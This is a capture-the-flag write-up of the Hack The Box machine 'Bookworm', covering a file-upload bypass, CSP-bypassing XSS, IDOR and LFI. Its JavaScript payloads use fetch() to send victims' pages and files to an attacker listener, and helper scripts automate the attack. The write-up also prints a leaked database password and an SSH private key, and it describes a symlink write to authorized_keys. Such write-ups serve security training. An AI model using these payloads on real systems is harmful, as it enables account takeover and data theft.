---
title:  "HTB Bookworm Writeup"
date:   2024-01-23 00:30:00 
categories: HTB Machine
tags: SQLI Directory-Traversal Postscript-Injection LFI XSS-Bypass-CSP Symlink File-Bypass
---

<a href="{{ post.url | relative_url }}{{ post }}" title="{{ post.title }}">



![](/images/bookworm/2024-01-23-15-48-24.png)

# Machine Info
 > Bookworm is an insane Linux machine that features a number of web exploitation techniques. It features a website for a book store with a checkout process vulnerable to HTML injection, as well as an IDOR vulnerability that allows the updating of shop baskets for any user. Leveraging these vulnerabilities is possible by taking advantage of an insecure avatar file upload, where a malicious JavaScript file can be uploaded to bypass CSP restrictions. By exploiting this chain of vulnerabilities a CSRF payload is crafted to enumerate hidden endpoints and discover an LFI to leak database credentials for the underlying ExpressJS web application. Lateral movement is achieved by exploiting an LFI and a symlink vulnerability with an eBook conversion utility. Finally, sudo access to a script susceptible to SQL Injection leads to privileged arbitrary file read/write through a PostScript template, leading to a shell as root.
 

 ![](/images/bookworm/2024-01-23-15-50-27.png)

 Look at there have login form you can create your account login i've has been login so now we try find `html injection` because on machine info there said vulnerable to `Html Injection` also an IDOR vulnerability . First of all go to shop and add to basket after you added go to your basket and edit the note and fill it with html code like this
 `<h1>dsd` then update the note . Going to complete checkout and html has been injected

 ![](/images/bookworm/2024-01-23-15-55-49.png)

 Looking at the url there have number id so i thinking IDOR vulnerability on this url let's we try change the number id . It's not working maybe IDOR vulnerability on another path .I've been tried xss attack and it's not working because it was prevent by CSP `Content-Security-Policy: The page’s settings blocked the loading of a resource at inline (“script-src”)`.To bypass CSP `script-src` need find xss in this domain and include with script src . Let's do it


 ## File Upload Bypass

 Moving on to `/profile` path 

The form in `/profile` we can upload avatar image for our account . Only jpg and png only can upload so we need bypass it the `Content-Type` . We'll upload `test.jpg` with tampering burpsuite and i rename `test.jpg` to `test.txt` or also you can upload `test.txt` directly and change the content-type but my situation now my `test.txt` not  are appearing so i need rename my file to .jpg first and rename on my burpsuite . Now upload your img and tampering with burpsuite and send to `Repeater`


![](/images/bookworm/2024-01-23-16-25-21.png)

You can using anything name extension files but you must Content-Type `image/jpg` or `image/png`
## XSS bypassing CSP

![](/images/bookworm/2024-01-23-16-27-11.png)

Now we've successfully bypassed file upload restrictions  . So look at the response is worked has been bypassed so now we just append xss code on `test.txt`

Let's take a minute to look at our existing findings:

- Ability to inject HTML into our basket
- Content Security Policy only allows sources for `self`
- The web application is using `ExpressJS`
- We bypassed file upload restrictions

Now we can upload a Javascript payload to our my avatar , also we can use HTML injection to load that payload , as it will then be sourced from the web application, thus bypassing the CSP. Let's change our payload from `sdstdtsdts` to this `alert(1);` . Go back to repeater and change the payload in the file . To continious the xss attack bypass csp we need include file that contains javascript xss payload .

```
<script src="/static/img/uploads/14"></script>
```
Go to your basket and copy this payload and fill it on our edit note

![](/images/bookworm/2024-01-23-16-52-03.png)

CSP successfully bypassed

## Foothold

Now that we have started to build an exploit chain, we need to determine how we can weaponize
this against other users. We could attempt to do a cookie steal via XSS, but the HTTPOnly flag on
the cookie will prevent this. We need a way to potentially attack another user to perform
additional actions. The first step here is to identify how we can deliver our payload to another
user. Knowing that we have HTML injection in a basket, we can start there. We begin by creating a
secondary account to experiment with.

## Insecure Direct Object Referencing (IDOR)

I've tried captured our basket's `Edit Note` request in `Burpsuite` reveals a basket identifier in the URI . Look at `POST` request showing id our basket's . We can finding their basket ID and Send payload xss attack to steal victim cookie . To see if we can leverage this information , we add create one more account then we edit the request in `Burpsuite` to point to our secondary accounts basket ID , which allows us to edit secondary accounts note .


```javascript
fetch("http://bookworm.htb/profile", { mode: 'no-cors' })
    .then((response) => response.text())
    .then((text) => {
        fetch("http://10.10.14.122:8000", {
            method: "POST",
            mode: 'no-cors',
            headers: {
                'Content-Type': 'text/plain',
            },
            body: text
        });
    });
```

![](/images/bookworm/2024-01-23-19-55-25.png)

I put this code on `test.txt` and i included file path have malicious code javascript to `Edit notes` but `python3 -m http.server` does not support `POST` response so our created code http.server the usage is same but the difference is this code support `POST` request 

```html
python3 post.py
Starting server on port 8000
<...snip...>

    <tr>
      <th scope="row">Order #168</th>
      <td>Tue Jan 23 2024 07:50:12 GMT+0000 (Coordinated Universal Time)</td>
      <td>£14</td>
      <td>
        <a href="/order/168">View Order</
      </td>
    </tr>
    
    <tr>
      <th scope="row">Order #170</th>
      <td>Tue Jan 23 2024 07:55:01 GMT+0000 (Coordinated Universal Time)</td>
      <td>£17</td>
      <td>
        <a href="/order/170">View Order</
      </td>
    </tr>
    
    <tr>
      <th scope="row">Order #172</th>
      <td>Tue Jan 23 2024 08:00:58 GMT+0000 (Coordinated Universal Time)</td>
      <td>£17</td>
      <td>
        <a href="/order/172">View Order</
      </td>
    </tr>
    
    <tr>
      <th scope="row">Order #185</th>
      <td>Tue Jan 23 2024 08:51:47 GMT+0000 (Coordinated Universal Time)</td>
      <td>£14</td>
      <td>
        <a href="/order/185">View Order</
      </td>
    </tr>
    <tr>
      <th scope="row">Order #230</th>
      <td>Tue Jan 23 2024 11:54:12 GMT+0000 (Coordinated Universal Time)</td>
      <td>£14</td>
      <td>
        <a href="/order/230">View Order</
      </td>
    </tr>
    
  </tbody>
</table>



  </div>

  </body>
</html>

10.10.14.122 - - [23/Jan 2024 07:00:08] "POST / HTTP/1.1" 200 -
```



# Script
I've been created POC to create new basket id and inject ou payload into them using the  `IDOR` vulnerability and with `Xss` attack to get order a list of orders from existing users. Xss attack used for sending the orders from existing users to my webserver and i can get the a list of orders victim's basket . The code at the below used for find victim's orders id try one by one id also including with my malicious code javascript and after i running this poc i will got orders id victim.

- post.py
```
from http.server import BaseHTTPRequestHandler, HTTPServer

class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        print(post_data.decode('utf-8'))
        self.send_response(200)
        self.end_headers()

def run(server_class=HTTPServer, handler_class=SimpleHTTPRequestHandler, port=8000):
    server_address = ('', port)
    httpd = server_class(server_address, handler_class)
    print(f"Starting server on port {port}")
    httpd.serve_forever()

if __name__ == "__main__":
    run()
```



- basket.py
```
import re
import requests

# Update with the current session cookie
cookies = {
    "session": "eyJmbGFzaE1lc3NhZ2UiOnt9LCJ1c2VyIjp7ImlkIjoxNCwibmFtZSI6ImRkc2QiLCJhdmF0YXIiOiIvc3RhdGljL2ltZy91c2VyLnBuZyJ9fQ==",
    "session.sig": "-5nNf6x7vzlHPXj1CVaOCVxg2QM"
}

headers = {
    "Cache-Control": "max-age=0",
    "Content-Type": "application/x-www-form-urlencoded"
}

# Update with the profile image ID
data = {
    "quantity": "1",
    "note": "<script src=\"/static/img/uploads/14\"></script>"
}

prev_id = ""

def get_id():
    try:
        response = requests.get('http://bookworm.htb/shop', headers=headers, cookies=cookies)
        find = r"<!-- (\d+) -->"
        match = re.search(find, response.text)
        if match:
            return match.group(1)
    except requests.RequestException as e:
        print(f"Error fetching ID: {e}")
    return None

while True:
    try:
        current_id = get_id()
        if current_id and not current_id == prev_id:
            print(f"Found new basket: {current_id}")
            prev_id = current_id
            url = f"http://bookworm.htb:80/basket/{current_id}/edit"
            print(f"Sending basket update to: {url}")
            requests.post(url, headers=headers, cookies=cookies, data=data)
    except KeyboardInterrupt:
        print('Exiting...')
        exit()
    except Exception as e:
        print(f"Error: {e}")
```

To run this code we need running `post.py` and `basket.py`

```
 python3 post.py | grep href
10.10.14.122 - - [23/Jan//images/bookworm/2024 07:22:49] "POST / HTTP/1.1" 200 -
10.10.11.215 - - [23/Jan//images/bookworm/2024 07:23:19] "POST / HTTP/1.1" 200 -
      href="/static/css/bootstrap.min.css"
        <a class="navbar-brand" href="#">Bookworm</a>
              <a class="nav-link " href="/">Home</a>
              <a class="nav-link " href="/shop">Shop</a>
                <a class="nav-link " href="/basket">Basket (0)</a>
                <a class="nav-link active" href="/profile">ddsd</a>
    <a href="/logout" class="btn btn-danger w-100">Logout</a>
        <a href="/order/168">View Order</
        <a href="/order/170">View Order</
        <a href="/order/172">View Order</
        <a href="/order/185">View Order</
        <a href="/order/230">View Order</
10.10.11.215 - - [23/Jan//images/bookworm/2024 07:23:19] "POST / HTTP/1.1" 200 -
      href="/static/css/bootstrap.min.css"
        <a class="navbar-brand" href="#">Bookworm</a>
              <a class="nav-link " href="/">Home</a>
              <a class="nav-link " href="/shop">Shop</a>
                <a class="nav-link " href="/basket">Basket (0)</a>
                <a class="nav-link active" href="/profile">Joe Bubbler</a>
    <a href="/logout" class="btn btn-danger w-100">Logout</a>
        <a href="/order/1">View Order</
```

I got the response from `basket.py` 

```
─# python3 update.py
Found new basket: 659
Sending basket update to: http://bookworm.htb:80/basket/659/edit
Found new basket: 660
Sending basket update to: http://bookworm.htb:80/basket/660/edit
Found new basket: 661
Sending basket update to: http://bookworm.htb:80/basket/661/edit
Found new basket: 662
Sending basket update to: http://bookworm.htb:80/basket/662/edit
```

Because the note in the basket section mentioned previous orders, let's take a minute to evaluate
the order numbers. We can see from the above output that there is a gap between the last order
(196) and the first few (16,17,18).Let's modify our payload

```
for (let i = 1; i <= 30; i++) {
    fetch(`http://bookworm.htb/order/${i}`, { mode: 'no-cors', credentials: 'include' })
        .then(response => response.text())
        .then(text => {
            fetch("http://10.10.14.50:8000", { mode: 'no-cors', method: "POST", body: text });
        });
}

```
Copy our payload and go back to `Repeater` and change file containing in `test.txt` .
After i ran `post.py` and `basket.py` i saw file .pdf on `/download` 

```
 <a href="/download/7?bookIds=9" download="Tom Slade with the Flying Corps: A Campfire Tale.pdf">Download e-book</a>
<a href="/profile">View Your Other Orders</a>
10.10.11.215 - - [23/Jan//images/bookworm/2024 08:26:08] "POST / HTTP/1.1" 200 -
      href="/static/css/bootstrap.min.css"
        <a class="navbar-brand" href="#">Bookworm</a>
              <a class="nav-link " href="/">Home</a>
              <a class="nav-link " href="/shop">Shop</a>
                <a class="nav-link " href="/basket">Basket (0)</a>
                <a class="nav-link " href="/profile">Jakub Particles</a>
        <a href="/download/8?bookIds=10" download="Ye Book of Copperheads.pdf">Download e-book</a>
        <a href="/download/8?bookIds=11" download="La vigna vendemmiata: novelle.pdf">Download e-book</a>
  <a href="/download/8?bookIds=7&amp;bookIds=20" download>Download everything</a>
<a href="/profile">View Your Other Orders</a>
      href="/static/css/bootstrap.min.css"
        <a class="navbar-brand" href="#">Bookworm</a>
              <a class="nav-link " href="/">Home</a>
              <a class="nav-link " href="/shop">Shop</a>
                <a class="nav-link " href="/basket">Basket (0)</a>
                <a class="nav-link " href="/profile">Jakub Particles</a>
        <a href="/download/9?bookIds=12" download="Through the Looking-Glass.pdf">Download e-book</a>
```

        
you can using 
`python3 post.py | grep download` but to find this firstly i used `grep href` to finding file or somethings else . Now i'll try check the files one by one maybe one of it contain password and username to login ssh . We can't access download link directly.We need modify our payload again to gain access download link and the type of content
that it sends . 

```
for(let i = 1; i <= 30; i++)
{
fetch("http://bookworm.htb/download/"+i+"?bookIds=13", { mode: 'no-cors',
credentials: 'include'})
      .then((response) => response.text())
      .then((text) => {
        fetch("http://10.10.14.122:8000", { mode: 'no-cors', method:"POST", body:
text})
    });
}
```

After a few minutes we have successfully get the file contain pdf

```
10.10.11.215 - - [23/Jan/2024 08:46:53] "POST / HTTP/1.1" 200 -
%PDF-1.3
3 0 obj
<</Type /Page
/Parent 1 0 R
/Resources 2 0 R
/Contents 4 0 R>>
endobj
4 0 obj
<</Filter /FlateDecode /Length 95>>
stream
x 3R  2 35W( r
Q w3T04 Z* [ ꙛ+  (hx$ +x  $ f i* d    L2 `  k gf P    c  
endstream
endobj
1 0 obj
<</Type /Pages
/Kids [3 0 R ]
/Count 1
/MediaBox [0 0 595.28 841.89]
>>
```


## Local File Inclusion

Let's now test for a Local File Inclusion (LFI) vulnerability using the format of the "Download everything" links

Look at `bookIds=` there combine to another files pdf so i think maybe we can Directory traversal and exploit Lfi .


```
fetch('/profile', {credentials: 'include'})

.then((resp) => resp.text())

.then((resptext) => {

  order_id = resptext.match(/\/order\/(\d+)/);

  fetch("http://bookworm.htb/download/"+order_id[1]+"?bookIds=1&bookIds=../../../etc/passwd", {credentials: 'include'})

  .then((resp2) => resp2.blob())

  .then((data) => {

    fetch("http://10.10.14.122/upload", { 

      method: "POST",

      mode: 'no-cors',

      body: data

    });

  });

});
```

```
Starting server on port 8000
p >VHans Holbein.pdfmR nA%F 
R  E"9   3^G    *A^ HAX   ^ 7 g  1 T 
<...snip...>
N WW $ h c  ?
VU <  |. UxUy  l K ǡo  d m^   b    /  FA!  z   , c     _O 9.!
ί ˲Kx P   "Pp >Vɚ o   Hans Holbein.pdfP   V   "'
   Unknown.pdfPKw
10.10.11.215 - - [04/Dec/2023 18:14:30] "POST / HTTP/1.1" 200 -
```
the response still same as pdf file but look like zip file to get file contain `Unknown.pdf` we'll try create a python webserver to get the pdf file.

- web.py
```
from pathlib import Path
from flask import Flask, request

app = Flask(__name__)

@app.route('/upload', methods=["POST"])
def exfil():
    print("Got a file")
    data = request.get_data()
    output = Path(f'upload/upload.zip')
    output.write_bytes(data)
    return ""

if __name__ == "__main__":
    app.run(debug=True, host="0.0.0.0", port=80)
```
Don't forget create directory upload . After a few minutes i ran `web.py` and `basket.py` i got the pdf file 

Update our payload to utilize the upload form
```
┌──(root㉿kali)-[/home/…/Desktop/htb/bookworm/upload]
└─# unzip upload.zip          

Archive:  upload.zip
  inflating: Alice's Adventures in Wonderland.pdf  
  inflating: Unknown.pdf     
```

I've got the .pdf file so now let's using strings command to verify vulnerable lfi or not

```
┌──(root㉿kali)-[/home/…/Desktop/htb/bookworm/upload]
└─# strings Unknown.pdf                           
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
frank:x:1001:1001:,,,:/home/frank:/bin/bash
neil:x:1002:1002:,,,:/home/neil:/bin/bash
mysql:x:113:118:MySQL Server,,,:/nonexistent:/bin/false
fwupd-refresh:x:114:119:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
_laurel:x:997:997::/var/log/laurel:/bin/false
james:x:1000:1000:,,,:/home/james:/bin/bash
                                              
``` 

That vulnerable lfi and directory traversal . Look at /home directory there have 3 username is `james` , `neil` and `frank`

## Enumerate File System

The website is used Express , Express usually  used this name files and mostly them used this name files is 
- index.js
- package.json
- app.js
- database.js

I thinking `database.js` have the password for ssh let's we get it . Our just using same payload at the above our just change the name file `../../../etc/passwd` to `../database.js` 

```
┌──(root㉿kali)-[/home/…/Desktop/htb/bookworm/upload]
└─# strings Unknown.pdf             
const { Sequelize, Model, DataTypes } = require("sequelize");
//const sequelize = new Sequelize("sqlite::memory::");
const sequelize = new Sequelize(
  process.env.NODE_ENV === "production"
    ? {
        dialect: "mariadb",
        dialectOptions: {
          host: "127.0.0.1",
          user: "bookworm",
          database: "bookworm",
          password: "FrankTh3JobGiver",
        },
```

i got the password from database let's try login ssh with this username is `james , neil and frank` and fill it with this password . I've been tried all username only frank successfully login . For privilege escalation i'ill try check what numbers port are open to exploit it . To check openport in localhost you can using netstat

```
frank@bookworm:~$ netstat -tln
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:3001          0.0.0.0:*               LISTEN     
tcp6       0      0 :::22                   :::*                    LISTEN    
```
The service on 127.0.0.1:3000 is just the server behind port 80:

```
frank@bookworm:~$ curl localhost:3001
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>E-book Converter</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-GLhlTQ8iRABdZLl6O3oVMWSktQOp6b7In1Zl3/Jr59b6EGGoI1aFkw7cmDA6j6gD" crossorigin="anonymous">
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.bundle.min.js" integrity="sha384-w76AqPfDkMBDXo30jS1Sgez6pr3x5MlQ1ZAGC+nuZB+EYdgRZgiwxhTBTkF7CXvN" crossorigin="anonymous"></script>
</head>
<body>
    <div class="container mt-4">
        <h1 class="mt-4">Bookworm Converter Demo</h1>
        
        
        <form method="POST" enctype="multipart/form-data" action="/convert">
            <div class="mb-3">
                <label for="convertFile" class="form-label">File to convert (epub, mobi, azw, pdf, odt, docx, ...)</label>
                <input type="file" class="form-control" name="convertFile" accept=".epub,.mobi,.azw3,.pdf,.azw,.docx,.odt"/>
                <div id="convertFileHelp" class="form-text">Your uploaded file will be deleted from our systems within 1 hour.</div>
            </div>
            <div class="mb-3">
                <label for="outputType" class="form-label">Output file type</label>
                <select name="outputType" class="form-control">
                    <option value="epub">E-Pub (.epub)</option>
                    <option value="docx">MS Word Document (.docx)</option>
                    <option value="az3">Amazon Kindle Format (.azw3)</option>
                    <option value="pdf">PDF (.pdf)</option>
                </select>
            </div>
```

Let's we forward port 3001 to my localhost

`ssh -L 3001:127.0.0.1:3001 frank@bookworm.htb`

![](/images/bookworm/2024-01-24-15-16-44.png)

There show the file upload . There gave your hint with `converter` so let's we find the directory `converter` . I found directory converter on `/home/neil`

```
frank@bookworm:/home$ ls
frank@bookworm:/home$ cd neil/
frank@bookworm:/home/neil$ 
frank@bookworm:/home/neil$ ls converter/
calibre  index.js  node_modules  output  package.json  package-lock.json  processing  templates
```

## Source Code review

- index.js
```
const express = require("express");
const nunjucks = require("nunjucks");
const fileUpload = require("express-fileupload");
const path = require("path");
const { v4: uuidv4 } = require("uuid");
const fs = require("fs");
const child = require("child_process");

const app = express();
const port = 3001;

nunjucks.configure("templates", {
  autoescape: true,
  express: app,
});

app.use(express.urlencoded({ extended: false }));
app.use(
  fileUpload({
    limits: { fileSize: 2 * 1024 * 1024 },
  })
);

const convertEbook = path.join(__dirname, "calibre", "ebook-convert");

app.get("/", (req, res) => {
  const { error } = req.query;

  res.render("index.njk", { error: error === "no-file" ? "Please specify a file to convert." : "" });
});

app.post("/convert", async (req, res) => {
  const { outputType } = req.body;

  if (!req.files || !req.files.convertFile) {
    return res.redirect("/?error=no-file");
  }

  const { convertFile } = req.files;

  const fileId = uuidv4();
  const fileName = `${fileId}${path.extname(convertFile.name)}`;
  const filePath = path.resolve(path.join(__dirname, "processing", fileName));
  await convertFile.mv(filePath);

  const destinationName = `${fileId}.${outputType}`;
  const destinationPath = path.resolve(path.join(__dirname, "output", destinationName));

  console.log(filePath, destinationPath);

  const converter = child.spawn(convertEbook, [filePath, destinationPath], {
    timeout: 10_000,
  });

  converter.on("close", (code) => {
    res.sendFile(path.resolve(destinationPath));
  });
});

app.listen(port, "127.0.0.1", () => {
  console.log(`Development converter listening on port ${port}`);
});
```

Look at `index.js` there running as port 3000 so the source code on `/home/neil` directory . To get priv8 key ssh neil we need upload pdf file but i've tried upload a pdf file but the response is `Not Found` let's we file bypass upload on `Content-type` firstly create a txt file and rename to pdf file and upload that file and capturing with `Burpsuite` and change pdf to txt you will get `.epub` file . After that gonna unzip `.epub` file . Do not forget send the request to `Repeater`

```
┌──(kali㉿kali)-[~/Downloads]
└─$ unzip convert.epub
Archive:  convert.epub
 extracting: mimetype                
   creating: META-INF/
  inflating: META-INF/container.xml  
  inflating: toc.ncx                 
  inflating: index.html              
  inflating: stylesheet.css          
  inflating: page_styles.css         
  inflating: titlepage.xhtml         
  inflating: cover_image.jpg         
  inflating: content.opf    
  ```



```
┌──(kali㉿kali)-[~/Downloads]
└─$ cat index.html     
<?xml version='1.0' encoding='utf-8'?>
<html xmlns="http://www.w3.org/1999/xhtml">
  <head>
    <title>a64a2ae5-ff70-43de-b64d-6b60d0c79c30</title>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>
  <link rel="stylesheet" type="text/css" href="stylesheet.css"/>
<link rel="stylesheet" type="text/css" href="page_styles.css"/>
</head>
  <body class="calibre">
<p class="calibre1">converted text file</p>
</body></html>
```

This means we can likely read files as the neil user . So we tried using `img src` tag to capture priv8 keys .


```
frank@bookworm:/home/neil$ ls ../frank/.ssh
id_ed25519  id_ed25519.pub
```
Frank user used `id_ed25519` this name file a priv8 key maybe neil user is same we'll try


Go to repeater and change `test.txt` to `test.html` and change the file contains like this

`<img src="file:///home/neil/.ssh/id_ed25519">`

![](/images/bookworm/2024-01-24-19-28-00.png)

Right click mouse on the request and then click > `Request in browser` > `in original session` and then just copy the url and go to your browser and you will get the priv8 keys . Or you can just upload `test.html` directly

```
──(kali㉿kali)-[~/Downloads/convert]
└─$ unzip convert1.epub
Archive:  convert1.epub
 extracting: mimetype                
   creating: META-INF/
  inflating: META-INF/container.xml  
  inflating: toc.ncx                 
  inflating: stylesheet.css          
  inflating: page_styles.css         
  inflating: titlepage.xhtml         
  inflating: cover_image.jpg         
  inflating: .id_ed25519             
  inflating: 65f057b9-d49c-491d-849b-8c27e971d444.html  
  inflating: content.opf             
                                                                                                                                                                                             
┌──(kali㉿kali)-[~/Downloads/convert]
└─$ cat .id_ed25519
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACDqcgcBPB2+qqbrzHBH++n0a0xbnp088c/nj/jcObTGfwAAAJCAnJQ/gJyU
PwAAAAtzc2gtZWQyNTUxOQAAACDqcgcBPB2+qqbrzHBH++n0a0xbnp088c/nj/jcObTGfw
AAAEBrbl4nCKjLMwUPwU1NC7iqA3TZaJOHfcFK9sRmYmUXiepyBwE8Hb6qpuvMcEf76fRr
TFuenTzxz+eP+Nw5tMZ/AAAADW5laWxAYm9va3dvcm0=
-----END OPENSSH PRIVATE KEY-----
```

I got a priv8 key let's we login as `neil` user . Let's we login 

```
┌──(kali㉿kali)-[~/Downloads/convert]
└─$ ssh -i .id_ed25519 neil@bookworm.htb
The authenticity of host 'bookworm.htb (10.10.11.215)' can't be established.
ED25519 key fingerprint is SHA256:AgjA6QZO27xdMZeO8OuusxsDQQ6eD0OCl71bDcSc8u8.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'bookworm.htb' (ED25519) to the list of known hosts.
neil@bookworm.htb's password: 
```

There still need a password to login . Because on `/home/neil/.ssh` not have authorized_keys so we need upload neil copy public key and creating `authorized_keys` then paste the neil public key . To grab public key used same way at the above just append `.pub`

The payload is : `<img src="file:///home/neil/.ssh/id_ed25519.pub">`

```
┌──(kali㉿kali)-[~/Downloads/test]
└─$ unzip 'convert(1).epub'

Archive:  convert(1).epub
 extracting: mimetype                
   creating: META-INF/
  inflating: META-INF/container.xml  
  inflating: id_ed25519.pub          
  inflating: toc.ncx                 
  inflating: stylesheet.css          
  inflating: page_styles.css         
  inflating: 35b066b1-0f78-48cd-8c65-43f9c82658c3.html  
  inflating: titlepage.xhtml         
  inflating: cover_image.jpg         
  inflating: content.opf 
  ```

```
┌──(kali㉿kali)-[~/Downloads/test]
└─$ cat id_ed25519.pub
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOpyBwE8Hb6qpuvMcEf76fRrTFuenTzxz+eP+Nw5tMZ/ neil@bookworm
```

## Symlink Attacks


# Symlink on ebookconverter

```
frank@bookworm:/home/neil/converter/calibre$ echo 'test' > /tmp/test.txt
frank@bookworm:/home/neil/converter/calibre$ ./ebook-convert /tmp/test.txt /tmp/test2.txt
1% Converting input to HTML...
InputFormatPlugin: TXT Input running
on /tmp/test.txt
Language not specified
Creator not specified
Building file list...
Normalizing filename cases
Rewriting HTML links
flow is too short, not running heuristics
Forcing index.html into XHTML namespace
34% Running transforms on e-book...
Merging user specified metadata...
Detecting structure...
Auto generated TOC with 0 entries.
Flattening CSS and remapping font sizes...
Source base font size is 12.00000pt
Removing fake margins...
Cleaning up manifest...
Trimming unused files from manifest...
Creating TXT Output...
67% Running TXT Output plugin
Converting XHTML to TXT...
TXT output written to /tmp/test2.txt
Output saved to   /tmp/test2.txt
```
Look at there the Output can saved to `/tmp/test2.txt` so on `index.js` already combine with `ebook-convert` so maybe we can symlink via website .

```
const convertEbook = path.join(__dirname, "calibre", "ebook-convert");
```



## Web Symlink
So our found another way to upload the public keys as authorized_keys . Going to localhost:3001 we'll try directory traversal in `outputType`, since the web application does not seem to properly sanitize user input. In the `outputType` section, we specify the path of the neil user's authorized_keys file, in an
attempt to write the public key to it.

![](/images/bookworm/2024-01-25-10-43-18.png)

It's failed to created authorized_keys with a `404 Not Found` response .
If we change the path to /tmp/test , we do see that neil is creating files in the directory that we specify

![](/images/bookworm/2024-01-25-10-45-39.png)

```
frank@bookworm:~$ ls /tmp
authorized_keys.txt                                                           systemd-private-a734598c94884452a8891be6212edbca-systemd-logind.service-9l7DUf
Crashpad                                                                      systemd-private-a734598c94884452a8891be6212edbca-systemd-resolved.service-2DL51g
puppeteer_dev_chrome_profile-jc4KKv                                           systemd-private-a734598c94884452a8891be6212edbca-systemd-timesyncd.service-gmrFPh
runtime-neil                                                                  systemd-private-a734598c94884452a8891be6212edbca-upower.service-NddGQf
snap-private-tmp                                                              vmware-root_731-4248811549
systemd-private-a734598c94884452a8891be6212edbca-ModemManager.service-mSUb0e
```
The file has been uploaded in `/tmp` directory so now we'll run ln command to create a symbolic link (symlink) to an existing or directory

```
frank@bookworm:/dev/shm$ ln -s /home/neil/.ssh/authorized_keys pwn.txt
```



```
frank@bookworm:/dev/shm$ ls -la
total 4
drwxrwxrwt  2 root  root    80 Jan 25 03:08 .
drwxr-xr-x 18 root  root  3960 Jan 24 05:03 ..
-rw-r--r--  1 neil  neil   100 Jan 25 03:05 authorized_keys.txt
lrwxrwxrwx  1 frank frank   31 Jan 25 03:08 pwn.txt -> /home/neil/.ssh/authorized_keys
```

![](/images/bookworm/2024-01-25-11-12-04.png)

I've got `500 Internal Server` because has been protected by symlink [protected_symlink](https://sysctl-explorer.net/fs/protected_symlinks/)

When set to “0”, symlink following behavior is unrestricted.

When set to “1” symlinks are permitted to be followed only when outside a sticky world-writable directory, or when the uid of the symlink and follower match, or when the directory owner matches the symlink’s owner.

We'll try symlink from frank directory and create a symbolic link files .

```
frank@bookworm:~$ ln -s /home/neil/.ssh/authorized_keys b.txt
frank@bookworm:~$ pwd
/home/frank
```

![](/images/bookworm/2024-01-25-11-20-16.png)

It's worked !! so now we just login the ssh with neil priv8 keys


![](/images/bookworm/2024-01-25-11-17-53.png)

Successfully login SSH

## Shell as as root

```
neil@bookworm:~$ sudo -l
Matching Defaults entries for neil on bookworm:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User neil may run the following commands on bookworm:
    (ALL) NOPASSWD: /usr/local/bin/genlabel
```

Neil user can run `/usr/local/bin/genlabel` this as root .

```
neil@bookworm:~$ sudo /usr/local/bin/genlabel
Usage: genlabel [orderId]
neil@bookworm:~$ sudo /usr/local/bin/genlabel 11
Fetching order...
Generating PostScript file...
Generating PDF (until the printer gets fixed...)
Documents available in /tmp/tmp170yfwddprintgen
```
There generated a pdf file using order id .

![](/images/bookworm/2024-01-25-11-25-38.png)

I used python3 http.server to download `output.pdf`

# Source
genlabel actually a python script not binary . The script are connects to the DB as the bookworm user just like on the website

```
